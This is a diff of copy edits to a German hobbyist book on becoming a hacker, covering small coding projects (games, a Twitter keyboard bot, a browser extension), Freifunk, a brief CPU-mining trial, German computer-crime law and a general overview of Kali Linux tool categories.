-Das Start-Beispiel beginnt mit einem Spiel, bei dem eine Zufallszahl generiert wird und mit einer einfachen Eingabe geraten wird. Dafür braucht es "use rand::Rng;“. Wir installieren das Paket, wie im Beispiel. Damit die Werte auf einfache Weise verglichen werden können, nutzen wir cmp::Ordering. Ich kopiere den Code aus dem Beispiel, schaue mir an wie . Das kleine Ratespiel aus der Dokumentation: https://github.com/Leetcore/hackerz/blob/master/guess-game-rust/src/main.rs 
+Das Start-Beispiel beginnt mit einem Spiel, bei dem eine Zufallszahl generiert wird und mit einer einfachen Eingabe geraten wird. Dafür braucht es "use rand::Rng;“. Wir installieren das Paket, wie im Beispiel. Damit die Werte auf einfache Weise verglichen werden können, nutzen wir cmp::Ordering. Ich kopiere den Code aus dem Beispiel, schaue mir an wie . Das kleine Ratespiel aus der Dokumentation: https://github.com/Leetcore/wie-werde-ich-hacker/tree/master/scripts/guess-game-rust
 
 Wer einmal die Grundlagen der Dokumentation durchprobiert hat und danach auch noch weiß was er gerne damit programmieren möchte, hat gute Karten die Sprache richtig zu lernen.
 
@@ -1190,7 +1186,7 @@ Wir sind nun ein paar wichtige Grundlagen durchgegangen. Neben Programmierung is
 
 —
 Verschlüsselung
-Cryptosysteme sind wie ein Kaninchenbau, aus dem du nie wieder raus kommst. Im Prinzip funktioniert asymmetrische Verschlüsselung mit einem Schlüsselpaar: Ein öffentlicher Schlüssel und ein privater Schlüssel.
+Kryptosysteme sind wie ein Kaninchenbau, aus dem du nie wieder raus kommst. Im Prinzip funktioniert asymmetrische Verschlüsselung mit einem Schlüsselpaar: Ein öffentlicher Schlüssel und ein privater Schlüssel.
 
 Durch das asymmetrische Verschlüsselungsverfahren kann eine Nachricht, die mit diesem öffentlichen Schlüssel verschlüsselt wurde, nur mit dem privaten, geheimen Schlüssel entschlüsselt werden. Mathematisch wird das mit Einweg Funktionen realisiert, die leicht zu berechnen sind, es aber praktisch unmöglich ist sie zurück zu rechnen. In so ziemlich jedem Beispiel heißen die zwei Kommunikationsteilnehmer Alice und Bob, auch im Wikipedia Artikel: "Asymmetrisches Kryptosystem". Das ist einer der sehr guten Wikipedia Artikel, was mich nochmal daran erinnert, dass ich alle Informationsquellen lokal sichern wollte. Der Artikel zu RSA und die weiterführenden Links mit Einzelnachweisen können als Einstieg hilfreich sein. Im Artikel "RSA-Kryptosystem" ist auch ein Beispiel dabei.
 
@@ -1303,7 +1299,7 @@ Je nach Betriebssystem sehen die Fische übrigens anders aus, weil die Emojis vo
 
 Im Prinzip besteht das Aquarium auf HTML und CSS, den Blockelementen mit Emojis drin und JavaScript mit einem Timer, sowie ein Zufallsgenerator, der die Fische bewegt. Es soll einfach nur hübsch aussehen und im Browser Vollbild auf einem Tablet kommt es gut zur Geltung.
 
-Quelle: https://fishies.glitch.me/
+Demo: https://fishies.glitch.me/
 
 Partikel
 Früher konnte ich mich sehr über die WinAMP Visualisierung freuen, die hübsche Partikel und Wellen passend zur Musik angezeigt hatte. Es gibt unzählige Demos und Beispiele, die etwas in Richtung Visualisierung tun. Im Web Bereich lohnt es sich bei CodePen.io vorbei zu schauen. Hier gibt es viele Demos mit dem entsprechenden Code dazu. Eine Quelle an Inspiration und Mustern, die sich der/die geneigte Hacker/-in abschauen und modifizieren kann.
@@ -1311,7 +1307,6 @@ Früher konnte ich mich sehr über die WinAMP Visualisierung freuen, die hübsch
 Da ich ein Freund des WWWs bin, picke ich mir ein Beispiel von Code Pen. Dort gibt es eine Partikel-Demo, die bewegte Kreise zeichnet.
 
 Also schauen wir uns den Code an und modifizieren ihn. Zwischen den Frames habe ich ein Reset entfernt, sodass die Punkte nicht erneut auf schwarzem Hintergrund gezeichnet werden, sondern ihre Spuren hinterlassen. Dadurch bekommst du einen relativ schnellen Einstieg in Canvas Elemente und kannst auf der Basis ausprobieren, welche Änderungen dir gefallen.
-
 
 
 Demo: https://codepen.io/leetcore/pen/OJPLZOm
@@ -1336,9 +1331,7 @@ END
 
 RND(1) erzeugt eine Zufallszahl zwischen Null und Eins. Die Darstellung der ist leider nicht gleich z.B. passt die Zeilenhöhe im Emulator nicht. Da ich mich dort allerdings im Browser befinde, helfe ich mit CSS und "line-height: 11px" etwas nach. Außerdem sind die Zeichen zu weit auseinander, da hilft "letter-spacing: -3px".
 
-Das Ergebnis ist mit Slash und Backslash dann doch ganz okay:
-
-
+Das Ergebnis ist mit Slash und Backslash doch ganz okay:
 
 Das sieht für mich nach einem Labyrinth aus. Ziel erfüllt!
 
@@ -1347,9 +1340,9 @@ Da ich ein Freund des WWWs bin und mich damit auskenne, fing ich an bestimmte Sp
 
 Für aufwändige Grafiken und Animationen fehlt mir die Zeit und das Talent, deshalb benutze ich meistens Emojis oder eben gar keine Grafiken. Aber ich mag die Challenge. Also habe ich mir ein Limit von einer Stunde gesetzt und versucht in irgendeiner Form etwas Spielbares zu bauen.
 
-Die Idee war eine Reihe von Quadraten, die in richtiger Reihenfolge angeklickt werden sollen. Ähnlich wie "Mastermind" ohne Farbe. Es geht nur um die Reihenfolge.
+Die Idee war eine Reihe von Quadraten, die in richtiger Reihenfolge angeklickt werden sollen. Ähnlich wie das Spiel "Mastermind", nur ohne Farben.
 
-Als erstes sollte ganz grob klar sein, welche Aufgaben erfüllt werden müssen, was dich im besten Fall zu einer Art Ablaufplan führt.
+Als erstes sollte ganz grob klar sein welche Aufgaben erfüllt werden müssen, was dich im besten Fall zu einer Art Programmablaufplan führt.
 
 Der grobe Ablaufplan ist folgender:
 Neue Runde initialisieren.
@@ -1371,7 +1364,7 @@ Hacker/-innen beschäftigen sich mit allem, was ihnen Freude bereitet und bauen 
 Textadventure
 Ich bin ein großer Fan von Textadventures. Die gibt es in mehreren Varianten. Zum Beispiel als interaktive Geschichte, bei der Optionen vorgegeben werden oder direkt mit Befehlseingabe.
 
-Nachdem ich eine interaktive Geschichte gebaut hatte, wofür es übrigens auch Communities und offene Tools im Internet gibt, widmete ich mich den RPGs (= Rollenspiele). Die Idee war ein Chatbot als Eingabe eines Dungeon Spiels. Per direkter Nachricht auf Twitter können Befehle gesendet werden und alles was passiert wird als Direktnachricht beschrieben. Im Dungeon gibt es Kisten, Heiltränken, normale Gegner, stärkere Gegner und starken Bossen, Waffen, kritischen Treffern und eine Webseite mit Karte.
+Nachdem ich eine interaktive Geschichte gebaut hatte, wofür es übrigens auch Communities und offene Tools im Internet gibt, widmete ich mich den RPGs (= Rollenspiele). Die Idee war ein Chatbot als Eingabe eines Dungeon Spiels. Per direkter Nachricht auf Twitter können Befehle gesendet werden und alles, was passiert, wird in Direktnachrichten kommuniziert. Im Dungeon gibt es Kisten, Heiltränken, normale Gegner, stärkere Gegner und starken Bossen, Waffen, kritischen Treffern und eine Webseite mit Karte.
 
 Die Befehle zur Steuerung werden als privater Nachricht dem Bot auf Twitter geschickt.
 
@@ -1393,43 +1386,40 @@ Der Twitter Textdungeon ist aufgebaut wie ein "Idle Game". Es passiert vieles au
 
 Im Grunde müssen die Spieler/-innen entscheiden auf welchem Feld sie bleiben und wenn sie in einem Kampf sind, zwischendurch heilen.
 
-Die Karte sieht so aus:
-
 Die Spieler starten oben links und sollen rechts zur Anfängertruhe gehen. Dort können sie sich das Anfängerschwert besorgen. Unter dem Start gibt es einen Heiltrank, der dich nichts kostet. "Bezahlt" wird übrigens in Heldentaten. Das sind nichts anderes als gewonnene Kämpfe. Im Dungeon gibt es eine Schmiede, bei der sich ein Schild kaufen oder ein Zauberspruch (= Waffe) lernen lässt. Jede Waffe hat eine Heilungschance und kritische Trefferchance, die im Kampf langsam abgenutzt wird. Starke Gegner lassen Loot (nur Waffen) fallen, die auf den jeweiligen Feldern aufgehoben werden können.
 
 Auf einem Feld gibt es eine Truhe, die immer wechselnde Waffen enthält. Sobald das Bossfeld leer ist, wird dort ein neuer Boss mit weiteren Gegnern erscheinen.
 
-Das ist ein kleiner Prototyp, den ich immer mal wieder zwischendurch pflege. Es haben immerhin 30 Leute ausprobiert. Das Spiel: https://textdungeon.glitch.me.
+Das ist ein kleiner Prototyp, den ich immer mal wieder zwischendurch pflege. Es haben immerhin 30 Leute ausprobiert und sind elendig im Dungeon gestorben. Das Spiel: https://textdungeon.glitch.me.
 
-Ich habe noch ein kleines Twitter-Projekt speziell für dieses Buch programmiert.
+Ich habe noch ein weiteres kleines Twitter-Projekt speziell für dieses Buch programmiert.
 
 Twitter To Keyboard
-Vielleicht kennst du bereits das Projekt, beidem ein Fisch auf der Streamingplattform "Twitch" in seinem Aquarium gezeigt wurde. Auf seinem Aquarium waren Rechtecke gezeichnet, die dann als Controller Eingaben für ein Videospiel benutzt wurden. Der magische Suchbegriffe für die datenschutzfreundliche Suchmaschine deiner Wahl lautet: "Fish Plays Pokemon". Das Prinzip wird dabei klarer, wir nutzen Eingaben aus einer Quelle, die eigentlich nicht dafür gedacht sind und das ist hoffentlich unterhaltsam. In meinem ersten Test wollte ich es nur ausprobieren.
+Vielleicht kennst du bereits das Projekt, bei dem ein Fisch auf der Streamingplattform "Twitch" in seinem Aquarium gezeigt wurde. Auf seinem Aquarium waren Rechtecke gezeichnet, die dann als Controller Eingaben für ein Videospiel benutzt wurden. Der magische Suchbegriffe für die datenschutzfreundliche Suchmaschine deiner Wahl lautet: "Fish Plays Pokemon". Das Prinzip wird dabei klarer, wir nutzen Eingaben aus einer Quelle, die eigentlich nicht dafür gedacht sind und das ist hoffentlich unterhaltsam. In meinem ersten Test wollte ich es nur ausprobieren.
 
 Eingabequelle finden.
 Ein Spiel finden, dass mit relativ wenigen Eingaben auskommt.
 Controller Eingaben zuweisen.
 Testen.
-Ganz viel testen, damit es irgendwie im Spiel interessant wird.
-Noch mehr testen mit dem Mapping der Eingaben.
+Ganz viel testen, damit es irgendwie interessant wird.
 
-Da ich gerne als einfaches Experiment starte, suche ich im ersten Schritt nach einem Tool, das es mir erlaubt meine Eingaben überhaupt in ein Spiel zu bekommen. Es gibt da bestimmte Engines und wenn ich Lust hätte mich da einzulesen, würde das bestimmt auch funktionieren.
+Da ich gerne als einfaches Experiment starte, suche ich im ersten Schritt nach einem Tool, das es mir erlaubt meine Tastatur Eingaben programmierbar in ein Spiel zu bekommen. Es auch bestimmte Engines und wenn ich Lust hätte mich da einzulesen, würde das bestimmt auch funktionieren, aber ich will es möglichst schnell und kurz halten.
 
-Aber ich mache die einfache Variante: Wie kann ich meine Tastatur Eingaben programmieren? Da fand ich recht schnell "RobotJS". Wie der Name schon verrät ist es für JavaScript geschrieben.
+Also mache ich die einfache Variante: Wie kann ich meine Tastatur Eingaben programmieren? Da fand ich recht schnell "RobotJS". Wie der Name schon verrät, ist es in JavaScript geschrieben.
 
 Desktop Automation. Control the mouse, keyboard, and read the screen. … RobotJS supports Mac, Windows, and Linux.
 
-Das passt doch erstmal.
+Das passt.
 
 Mein ursprünglicher Plan war es einen alten Emulator sowie mein Script zu starten und es das Spiel steuern zu lassen. Wenn Tastatureingaben aus einer unsicheren Quelle benutzt werden, sei es auch nur links, rechts, oben, unten oder "Enter", würde ich das trotzdem nicht unbeaufsichtigt lassen. Als dauerhaftes Projekt müsste ich mir zusätzliche Gedanken machen.
 
-Irgendwo muss am Ende auch das Spiel laufen. Entweder installiere ich dafür einen Emulator oder versuche mein Glück mit dem MS-DOS Emulator von archive.org. Dort können kostenlos alte Spiele gespielt werden. Ich wusste auch lange nicht welches Spiel dafür geeignet ist. Es gibt Projekte wie "Twitch plays Pokemon", aber selbst dort wissen die "Zuschauer/-innen" immerhin was sie tun.
+Irgendwo soll am Ende das Spiel laufen. Nur wo? Entweder installiere ich dafür einen Emulator oder versuche mein Glück mit dem MS-DOS Emulator von archive.org. Dort können kostenlos alte Spiele gespielt werden. Ich wusste auch lange nicht welches Spiel dafür geeignet ist. Es gibt Projekte wie "Twitch plays Pokemon", aber selbst dort wissen die "Zuschauer/-innen" immerhin was sie tun.
 
-Twitter hat eine Stream API, die ich auf einen Hashtag filtern kann, sodass nur öffentliche Tweets mit diesem Hashtag beachtet werden. Ich starte meinen "stream" und dort kommt alles an, was in Echtzeit mit diesem Tweet getwittert wird. Das Problem dabei ist, dass es darüber nicht absichtlich gespielt werden kann. Doppelte Tweets und ähnliche Tweets erkennt Twitter schnell als Spam.
+Twitter hat eine Stream API, die ich auf einen Hashtag filtern kann, sodass nur öffentliche Tweets mit diesem Hashtag beachtet werden. Ich starte meinen "stream" und es kommt alles an, was in Echtzeit mit diesem Tweet getwittert wird. Das Problem dabei ist, dass es darüber nicht absichtlich gespielt werden kann. Doppelte Tweets und ähnliche Tweets erkennt Twitter direkt als Spam.
 
-Ich hatte in meinem ersten Prototyp sogar eine "Multiplayer" Funktion, um bei "Streetfighter" gegeneinander zu kämpfen. Es ist auch kein Wunder, dass oft Pokemon für dieses Konzept benutzt wird. Bei Pokemon kannst du nicht komplett verlieren. Es läuft auch keine Zeit. Außerdem sind die Kämpfe rundenbasiert und es braucht kein Timing.
+Ich hatte in meinem ersten Prototyp sogar eine "Multiplayer" Funktion, um bei "Streetfighter" gegeneinander zu kämpfen. Es ist auch kein Wunder, dass oft Pokemon für dieses Konzept benutzt wird. Bei Pokemon kann ein/-e Spieler/-in nicht "Game over" sein. Es läuft auch keine Zeit. Außerdem sind die Kämpfe rundenbasiert und es braucht kein Timing, wie bei Streetfighter.
 
-Nachdem ich viel ausprobiert hatte, entschied ich mich für GTA 1 auf dem Gameboy. Das Spiel ist recht offen und es gibt nur wenige Eingabemöglichkeiten. Außerdem kann ein Spieler nicht allzu viel falsch machen. In der Konfiguration kann ich die Schlüsselwörter auf die entsprechenden Knöpfe zuweisen.
+Nachdem ich viel ausprobiert hatte, entschied ich mich für GTA 1 auf dem Gameboy. Das Spiel ist recht offen und es gibt nur wenige Eingabemöglichkeiten. Außerdem kann ein Spieler nicht allzu viel falsch machen. In meiner Konfiguration kann ich die Schlüsselwörter auf die entsprechenden Knöpfe zuweisen.
 
 Ich werde das ganze in einer Ubuntu VM starten. Also Ubuntu laden. Virtuelle Maschine erstellen. Ubuntu installieren. Danach RobotJS zum Laufen bewegen.
 
@@ -1443,18 +1433,18 @@ Ich war schon sehr froh, dass hier RobotJS ohne Probleme läuft, doch erstmal pa
 
 Jede Eingabe wird eine Sekunde ausgeführt, dadurch geht der Spieler auch ein Stück in eine Richtung, wenn der richtige Button erkannt wurde. Die Tweets lassen sich auch auf deutsche Tweets einschränken, dann brauche ich allerdings auch andere Begriffe, damit überhaupt etwas passiert. Die Aktionstasten nimmt er sich auch auf den gefundenen Tweets.
 
-Wenn ich auf die deutsche Sprache einschränke und nach links, rechts, oben und unten filtere, gibt es ständig Eingaben. Das liegt an vielen politischen Diskussionen und Propaganda auf Twitter. Das Projekt passt perfekt zur Twitter Kultur: Wild von links nach rechts zu laufen und dabei um sich zu schlagen. Das fasst politische Diskussionen auf Twitter auch gut zusammen.
+Wenn ich auf die deutsche Sprache einschränke und nach Wörtern wie "links", "rechts", "oben" und "unten" filtere, gibt es ständig Eingaben. Das liegt an vielen politischen (links, rechts)  Diskussionen und Propaganda auf Twitter. Das GTA-Projekt passt perfekt zur Twitter Kultur: Wild von links nach rechts zu laufen und dabei um sich zu schlagen. Das fasst politische Diskussionen auf Twitter auch gut zusammen.
 
-Wie auch immer. Das Script läuft. Ich zeichne mein Häkchen in meine imaginäre Liste. Der Code landet wie immer auf Github: https://github.com/Leetcore/hackerz/tree/master/twittertokeyboard
+Wie auch immer. Das Script läuft. Ich zeichne mein Häkchen in meine imaginäre Liste. Der Code landet wie immer auf Github: https://github.com/Leetcore/wie-werde-ich-hacker/tree/master/scripts/twittertokeyboard
 
 Firefox Erweiterung
-Browser-Erweiterungen sind normalerweise kleine Tools, die das Leben irgendwie leichter machen sollen. Als ich mich mit Chrome Erweiterungen beschäftigte, wollte ich einen Facebook Hasskommentar-Konverter bauen. Der sollte aus dummen Kommentaren auf Facebook irgendetwas lustiges machen. Damals, als man Facebook noch ernsthaft benutzt hat.
+Browser-Erweiterungen sind normalerweise kleine Tools, die das Leben leichter machen sollen. Als ich mich mit Chrome Erweiterungen beschäftigte, wollte ich einen Facebook Hasskommentar-Konverter bauen. Der sollte aus dummen Kommentaren auf Facebook irgendetwas lustiges machen. Damals, als Facebook von meiner Generation noch ernsthaft genutzt wurde.
 
-Die Erweiterung war im Chrome Store, wurde allerdings ungefähr ein halbes Jahr später entfernt, weil darin eben "Facebook" im Namen stand. Das könnte den Eindruck erwecken, dass es sich um eine offizielle Erweiterung von Facebook handelt. Als wäre Mark Zuckerberg morgens aufgestanden, hätte ein paar Runden in seinem Goldspeicher gedreht und wäre dann auf die Idee gekommen aus dem Hassproblem auf seiner Plattform einen Witz zu machen.
+Die Erweiterung war bereits im Chrome Store, wurde allerdings ungefähr ein halbes Jahr später entfernt, weil darin eben "Facebook" im Namen stand. Das könnte den Eindruck erwecken, dass es sich um eine offizielle Erweiterung von Facebook handelt. Als wäre Mark Zuckerberg morgens aufgestanden, hätte ein paar Runden in seinem Goldspeicher gedreht und wäre dann auf die Idee gekommen aus dem Hassproblem auf seiner Plattform einen mäßigen Witz zu machen.
 
-Ich schaue mir den Code von damals an und werde die Erweiterung für Firefox anpassen. Der erste Schritt ist wie immer: Eine Suchmaschine bedienen, um herauszufinden wie es überhaupt funktioniert. Ich versuche es mit "firefox extension develop" und lande auf einem alten Artikel des Mozilla Blogs. Glücklicherweise steht dort schon ein Hinweis, dass noch die alte Methode beschrieben wird und es sich geändert hat. Sogar mit einem Verweis auf den neusten Inhalt. Mozilla pflegt ihre Inhalte ziemlich gut.
+Es ist an der Zeit den Code zu überarbeiten, also schaue ich mir den Code von damals an und werde die Erweiterung für Firefox anpassen. Der erste Schritt ist wie immer: Eine Suchmaschine bedienen, um herauszufinden wie es überhaupt funktioniert. Ich versuche es mit "firefox extension develop" und lande auf einem alten Artikel des Mozilla Blogs. Glücklicherweise steht dort schon ein Hinweis, dass dort noch die alte Methode beschrieben wird und das System sich geändert hat. Sogar mit einem Verweis auf den neusten Inhalt. Mozilla pflegt ihre Inhalte ziemlich gut. Hut ab.
 
-Ich finde die Extension Seite in den "MDN web docs". Der Aufbau sollte eigentlich ähnlich zu den Chrome Extensions sein. Es gibt eine manifest.json, in der das Script und die Berechtigungen eingetragen werden. Ich kopiere zuerst meinen Code, der jetzt 4 Jahre auf dem Buckel hat, in einen Ordner und schaue mir an welche Fehlermeldungen mir Firefox um die Ohren wirft.
+Ich finde die Extension Seite in den "MDN web docs". Der Aufbau sollte ähnlich zu den Chrome Extensions sein. Es gibt eine manifest.json, in der das Script und die Berechtigungen eingetragen werden. Ich kopiere zuerst meinen Code, der jetzt 4 Jahre auf dem Buckel hat, in einen Ordner und schaue mir gleich an welche Fehlermeldungen mir Firefox um die Ohren wirft.
 
 Ich lese weiter in der Anleitung und öffne wie gewünscht die interne Seite im Browser mit "about:debugging#/runtime/this-firefox". Öffne ein "temporäres Add-on" und wähle mein manifest.json aus.
 
@@ -1469,7 +1459,7 @@ JS speichern.
 In Firefox about:debugging öffnen.
 "Neu laden" anklicken.
 
-In meinem alten Code war ein Fehler drin, bei dem ich mich fragen muss, wieso das überhaupt irgendwann mal funktioniert hat. Das ist übrigens der Klassiker. Aber vermutlich ist der Code nicht auf dem gleichen Stand wie die Erweiterung damals. Wie auch immer, das ignoriere ich erstmal und repariere es.
+In meinem alten Code war ein Fehler drin, bei dem ich mich fragen muss, wieso das überhaupt irgendwann mal funktioniert hat. Das ist übrigens der Klassiker. Aber vermutlich ist der Code nicht auf dem gleichen Stand wie die Erweiterung damals. Wie auch immer, das ignoriere ich und repariere es.
 
 In der Manifest-Datei wird angegeben auf welchen Webseiten dieses Script gestartet wird. Das lässt sich auch recht schnell auf Twitter anpassen. Also schaue ich mir das Twitter HTML an und schaue dort, wie ich an die Tweets komme.
 
@@ -1485,13 +1475,11 @@ Firefox: https://addons.mozilla.org/de/firefox/addon/hasskommentar-vong-konverte
 Chrome: https://chrome.google.com/webstore/detail/hasskommentar-%2B-vong-konv/lhgjekllgfidhpbmplbkpljhahjiikjo/related
 
 Hier ein Beispiel des Konverters auf tagesschau.de:
-
-
 Code: https://github.com/Leetcore/Hasskommentar-Konverter
 
 —
 Autonomie
-Selbstbestimmung taucht in Hacker-Guides immer wieder auf. Dabei geht es oft um selbstbestimmte Arbeit oder zumindest nach der Arbeit die eigenen Projekte voran zu treiben. Bei Autonomie geht es auch um Nachhaltigkeit. Das bedeutet z.B. alte Computer entweder zu verkaufen oder zu spenden und möglichst stromsparend damit umzugehen. Ich würde auch ein ordentliches Solarpanel dazu zählen, wenn es ein Smartphone oder Tablet laden kann. Etwas mit einer Anleitung aus dem Internet zu reparieren, statt es neu zu kaufen, passt auch zu Hacker/-innen. Alles was Abhängigkeit reduziert, wird gerne gesehen.
+In Hacker-Guides taucht immer wieder das Thema Selbstbestimmung auf. Dabei geht es oft um selbstbestimmte Arbeit oder zumindest nach der Arbeit die eigenen Projekte voran zu treiben. Autonomie wird leichter durch Nachhaltigkeit. Das bedeutet z.B. alte Computer entweder zu verkaufen oder zu spenden und möglichst stromsparend damit umzugehen. Ich würde auch ein ordentliches Solarpanel dazu zählen, wenn es ein Smartphone oder Tablet laden kann. Etwas mit einer Anleitung aus dem Internet zu reparieren, statt es neu zu kaufen. Alles, was Abhängigkeit reduziert, wird gerne gesehen.
 
 Freifunk
 Das Schützen der offenen Internet Infrastruktur oder der Aufbau einer alternativen Struktur ist ein wichtiger Bereich. Mit einem Freifunk-Router können Netzwerkverbindungen zwischen den Routern als Mesh (= Maschennetz) aufgebaut und ein Internetzugang geteilt werden. Durch den VPN Tunnel funktioniert das sogar ohne Störerhaftung (= Haftung des Routerbesitzers). Die Installationsanleitung des Freifunk-Routers ist ein gutes Beispiel für eine ordentliche Dokumentation.
@@ -1511,13 +1499,13 @@ Auf Neustart warten.
 Die offizielle Anleitung hat auch hübsche Fotos und zeigt dir genau welches Kabel in welchen Port gehört. Nachdem das Gerät neugestartet hat, ist auch schon das WLAN verfügbar. Wenn nun ein Internet-Router angeschlossen wird, kann über diesen Knoten auch gesurft werden.
 
 Bitcoins
-Das ist ein gutes Beispiel, wie eine utopische Idee innerhalb von zehn Jahren komplett von dem bestehenden System geschluckt wird. Bitcoins wurden zum Spekulationsobjekt und statt dem regen Austausch wird es nur benutzt, um damit seine Bankwährung zu vermehren. Es gibt wenige Dienste die Bitcoins akzeptieren und selbst die tun es nur, weil sie es wieder teurer an Spekulanten verkaufen können und nicht weil es danach weiter in den Umlauf kommt.
+Das ist ein gutes Beispiel, wie eine utopische Idee innerhalb von zehn Jahren komplett von dem bestehenden System geschluckt wird. Bitcoins wurden zum Spekulationsobjekt und statt dem regen Austausch wird es hauptsächlich benutzt, um damit seine Bankwährung zu vermehren. Es gibt wenige Dienste die Bitcoins akzeptieren und selbst die, die es tun, tun es nur, weil sie es wieder teurer an Spekulanten verkaufen können und nicht weil es danach weiter in den Umlauf kommt.
 
 Auf dem Schwarzmarkt wird es benutzt, weil es eine pseudonyme Digitalwährung ist. Aber Bitcoins schürfen lohnt sich eben nur, wenn am Ende die Stromrechnung explodiert. Es wird also viel Strom gegen eine digitale Währung getauscht, mit der der Nutzer leider praktisch wenig anfangen kann, außer sie eben wieder gegen Realwährung zu verkaufen.
 
-Ich bin deshalb skeptisch, was den ethischen Bereich angeht, da wurde eigentlich nicht viel gewonnen. Aber das ist auch nur meine Meinung. Als mögliches Projekt hatte ich nach einem Bitcoin Mini-USB-Miner geschaut. Mit einem Mini-USB-Miner kommt $1US an Wert pro Monat heraus, wenn ein einziger Miner 24 Stunden und 7 Tage die Woche läuft. So richtig Lust dafür Geld auszugeben hatte ich auch nicht, vor allem wenn sich das Gerät erst nach einem halben Jahr überhaupt selbst bezahlt. Es kann nichtmal mit Bitcoins im Internet bestellt werden, was das eigentliche Problem gut zusammenfasst. ;)
+Ich bin deshalb skeptisch, was den ethischen Bereich angeht, da wurde eigentlich nicht viel gewonnen. Aber das ist auch nur meine Meinung. Als mögliches Projekt hatte ich nach einem Bitcoin Mini-USB-Miner geschaut. Mit einem Mini-USB-Miner kommt $1US an Bitcoin-Dollar-Wert pro Monat heraus, wenn ein einziger Miner 24 Stunden und 7 Tage die Woche läuft. So richtig Lust dafür Geld auszugeben hatte ich auch nicht, vor allem wenn sich das Gerät erst nach einem halben Jahr überhaupt selbst bezahlt. Es kann nicht einmal mit Bitcoins im Internet bestellt werden, was das eigentliche Problem gut zusammenfasst. ;)
 
-Auf einem Raspberry Pi lässt sich auch mit der CPU Cryptowährung minen.  Die CPU ist sowieso zu langsam und der Raspberry Pi hat kaum Power. Neben Bitcoins gibt es aber auch über 100 andere Cryptowährungen. Das lohnt sich derzeit genauso wenig, aber ihr könnt auch darauf hoffen, dass andere Währungen auch den Hype erfahren. Wer früh einsteigt hat am Ende mehr Coins. Obwohl ich den Quatsch verabscheue installiere ich mir einen kleinen Coin Miner. Einfach nur um es abzuhaken.
+Auf einem Raspberry Pi lässt sich auch mit der CPU Kryptowährung minen.  Die CPU ist sowieso zu langsam und der Raspberry Pi hat kaum Power. Neben Bitcoins gibt es aber auch über 100 andere Kryptowährungen. Das lohnt sich derzeit genauso wenig, aber ihr könnt auch darauf hoffen, dass andere Währungen den gleichen Hype erfahren. Wer früh einsteigt hat am Ende mehr Coins. Obwohl ich den Quatsch verabscheue installiere ich mir einen kleinen Coin Miner. Einfach nur um es abzuhaken.
 
 Eine Internetsuche wird mir hoffentlich ein einigermaßen nützliches Tool bringen mit dem ich Bitcoin Mining starten kann, nur um es danach wieder zu deinstallieren. Ich öffne die offizielle Bitcoin Webseite und schaue mir an welche Tools es für Linux gibt. Ich brauche eine Wallet und einen Miner.
 
@@ -1547,7 +1535,6 @@ In einem Suchergebnis finde ich schnelle eine Zeile, die ich verstehen und anpas
 >>> cgminer --userpass userID.workerID:any-password --url stratum+tcp://stratum.slushpool.com:3333
 
 Damit startet zumindest irgendetwas:
-
 
 Es scheint zu funktionieren. Ich akzeptiere das als Ergebnis und suche mir wieder eine Aufgabe die mir auch wirklich Spaß macht. Die VM setze ich zurück auf den "Setup" Zustand, womit auch meine Wallet und der Miner gelöscht sind.
 
@@ -1593,12 +1580,12 @@ Der sogenannte Hackerparagraph stellt das "Vorbereiten des Ausspähens und Abfan
 (1) Wer unbefugt sich oder einem anderen Zugang zu Daten, die nicht für ihn bestimmt und die gegen unberechtigten Zugang besonders gesichert sind, unter Überwindung der Zugangssicherung verschafft, wird mit Freiheitsstrafe bis zu drei Jahren oder mit Geldstrafe bestraft.
 (2) Daten im Sinne des Absatzes 1 sind nur solche, die elektronisch, magnetisch oder sonst nicht unmittelbar wahrnehmbar gespeichert sind oder übermittelt werden.
 
-Alles was eine Zugangskontrolle, Login oder Sicherheitsabfrage hat, kann uns gefährlich werden. Wie das funktioniert erkläre ich bei "Password Attacks". Wir können das mit bereits geleakten Daten oder eigenen Testsystemen legal ausprobieren.
+Alles, was eine Zugangskontrolle, Login oder Sicherheitsabfrage hat, kann uns gefährlich werden. Wie das funktioniert erkläre ich bei "Password Attacks". Wir können das mit bereits geleakten Daten oder eigenen Testsystemen legal ausprobieren.
 
 § 202b Abfangen von Daten
 Wer unbefugt sich oder einem anderen unter Anwendung von technischen Mitteln nicht für ihn bestimmte Daten (§ 202a Abs. 2) aus einer nichtöffentlichen Datenübermittlung oder aus der elektromagnetischen Abstrahlung einer Datenverarbeitungsanlage verschafft, wird mit Freiheitsstrafe bis zu zwei Jahren oder mit Geldstrafe bestraft, wenn die Tat nicht in anderen Vorschriften mit schwererer Strafe bedroht ist.
 
-Alles was auch unter Sniffing oder WLAN-Hacking fällt. Beides können wir im eigenen Netzwerk testen.
+Alles, was auch unter Sniffing oder WLAN-Hacking fällt. Beides können wir im eigenen Netzwerk testen.
 
 Danach kommt der berühmte Hackerparagraph. 
 
@@ -1667,7 +1654,7 @@ Vorbereitung und Anreise:
 Handy abschalten.
 Wasser, Snacks!!!
 Eigenes WLAN am Laptop komplett abschalten, es darf nicht mal nach WLANs gesucht werden.
-USB Hardware Weiterleitung für Virtual Box einrichten: Dafür ist das "VirtualBox Extension Pack" notwendig. Es lässt sich zusätzlich auf deren Webseite herunterladen. Bei Virtual Box auf Einstellungen > Zusatzpakete > Rechts das + > "Extension Pack" Datei auswählen und damit aktivieren. In den VM (Virtuellen Maschine) Einstellungen > Ports > USB > + USB Stick wählen.
+USB Hardware Weiterleitung für Virtual Box einrichten:Dafür ist das "VirtualBox Extension Pack" notwendig. Es lässt sich zusätzlich auf deren Webseite herunterladen. Bei Virtual Box auf Einstellungen > Zusatzpakete > Rechts das + > "Extension Pack" Datei auswählen und damit aktivieren.In den VM (Virtuellen Maschine) Einstellungen > Ports > USB > + USB Stick wählen.
 VM starten und MAC Adresse schon mal ändern.
 Eigenen Passwortmanager dafür einrichten! Du wirst vermutlich ein paar Notizen sicher speichern müssen.
 Neuer Sicherheitspunkt in VM erstellen, um sie danach zurück zu setzen oder komplett zu löschen.
@@ -1682,19 +1669,19 @@ Kali Linux installieren
 Kali Linux ist eine Distribution, die verschiedene Hackingtools vorinstalliert hat und auf Debian basiert. Also herunterladen!
 
 Die Tools sind eingeordnet in Kategorien wie:
-Information Gathering: Informationsbeschaffung. Welche Server werden benutzt? Welche Dienste laufen dort? Wie ist die Infrastruktur?
-Vulnerability Analysis: Ähnlich wie "Information Gathering". Die Tools sollen allerdings auch bekannte Sicherheitslücken ausspucken.
-Web Application Analysis Webseiten auf Schwachstellen prüfen und auch automatisierte Tests durchführen.
-Database Assessment: In dieser Kategorie geht es um Datenbanken und hier kann automatisiert auf Schwachstellen getestet werden. Außerdem gibt es Crawler, die komplette Webseiten prüfen.
